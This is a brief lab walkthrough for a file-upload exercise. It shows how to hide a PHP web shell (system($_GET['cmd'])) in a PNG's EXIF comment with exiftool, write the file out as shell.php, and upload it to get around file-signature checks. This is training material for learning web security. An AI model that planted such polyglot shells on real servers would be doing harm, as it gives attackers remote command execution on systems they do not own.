# 5. Remote code execution via polyglot web shell upload

Goal : upload php shell as a png image using exiftool modification.

Steps : 

- we can see server checking the file signature, so can attach php shell in the image.
- Run this command in terminal and take a image ex : abc.png

```php
exiftool -Comment='<?php system($_GET['cmd']); ?>' abc.png -o shell.php
```

- Now upload the image….and solve the LAB 🙂